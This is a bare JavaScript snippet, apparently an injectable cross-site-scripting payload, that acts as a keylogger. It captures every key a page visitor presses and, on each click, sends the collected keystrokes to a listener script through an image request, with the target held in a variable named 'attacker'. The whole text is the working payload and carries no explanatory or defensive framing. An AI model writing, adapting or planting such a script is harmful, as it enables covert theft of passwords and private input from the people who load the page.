
<script type="text/javascript">
var buffer = [];
var attacker = 'myphplistener.php?c='
document.addEventListener("keydown", function(e) {
  buffer.push(e.key);
});
document.onclick = function(){
	var data = encodeURIComponent(JSON.stringify(buffer));
	new Image().src = attacker + data;
	buffer = [];
}
</script>
